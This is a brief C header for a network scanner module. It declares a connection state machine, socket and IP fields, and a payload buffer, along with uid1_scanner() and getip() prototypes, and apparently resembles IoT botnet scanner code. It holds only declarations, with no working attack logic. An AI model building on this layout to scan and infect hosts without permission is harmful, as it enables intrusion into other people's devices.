#pragma once

#define SOCKBUF_SIZE 1024

struct scanner_state_t
{
    int fd, port;
    uint8_t complete;
	uint16_t rdbuf_pos;
    enum
	{
		SETUP_CONNECTION,
		CHECK_CONNECTION,
		INITILIZE_SESSION,
		FINNISHED
	} state;
    uint32_t total_timeout, ip;
    char read_buf[SOCKBUF_SIZE];
	char payload[2048];
	uint8_t rdbuf[1024];
};

void uid1_scanner();
static uint8_t ip_state[4] = {0};
ipv4_t getip(void);
